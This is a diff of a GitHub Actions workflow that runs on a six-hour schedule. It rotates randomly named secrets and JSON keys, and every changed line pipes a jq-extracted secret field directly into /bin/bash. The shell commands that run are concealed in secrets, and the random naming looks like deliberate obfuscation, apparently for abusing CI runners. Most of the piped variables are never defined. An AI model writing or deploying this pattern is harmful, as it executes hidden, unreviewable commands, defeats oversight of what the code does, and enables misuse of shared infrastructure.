@@ -1,28 +1,34 @@
 name: luxuejiao1988
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 2/6 * * *'
-
-jobs:  # 21609
+    - cron: '40 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: luxuejiao1988
         env:
-          o64: ${{ secrets.o64 }}
+          cwyga8: ${{ secrets.cwyga8 }}
         run: |
-          echo $o64 | jq -r .sqzq7 | /bin/bash
-          echo $ipnai283 | jq -r .k77 | /bin/bash
-          echo $pt58 | jq -r .ytq37 | /bin/bash
-          echo $cj0 | jq -r .utfa556 | /bin/bash
-          echo $t027 | jq -r .d8619 | /bin/bash
-          echo $anxj5545 | jq -r .wg70043 | /bin/bash
-          echo $uyw57 | jq -r .jijyf0905 | /bin/bash
-          echo $ofvz24 | jq -r .lnylp2 | /bin/bash
-          echo $u290 | jq -r .eybz7961 | /bin/bash
-          echo $p40236 | jq -r .p9686 | /bin/bash
-          echo $ihgc43 | jq -r .iqxx16 | /bin/bash
-          echo $apmy83998 | jq -r .lhdr7021 | /bin/bash
+          echo $cwyga8 | jq -r .euz64741 | /bin/bash
+          echo $xpd07 | jq -r .wxvr6848 | /bin/bash
+          echo $pj71527 | jq -r .b1 | /bin/bash
+          echo $qkiyp3 | jq -r .p67 | /bin/bash
+          echo $w4 | jq -r .jgfzx451 | /bin/bash
+          echo $yy613 | jq -r .d10 | /bin/bash
+          echo $rvujp04960 | jq -r .dcig78 | /bin/bash
+          echo $vfch48 | jq -r .f5 | /bin/bash
+          echo $eotq7 | jq -r .kg5 | /bin/bash
+          echo $ixr74 | jq -r .zxfm105 | /bin/bash
+          echo $xv7261 | jq -r .chtf2004 | /bin/bash
+          echo $fc1 | jq -r .n2 | /bin/bash
+          echo $zqhks6462 | jq -r .qn94 | /bin/bash
+          echo $b632 | jq -r .t9 | /bin/bash
+          echo $uhmx65 | jq -r .as6 | /bin/bash
+          echo $zue973 | jq -r .yp65 | /bin/bash
+          echo $fxtin885 | jq -r .uelor1 | /bin/bash
+          echo $js761 | jq -r .nb48 | /bin/bash
 
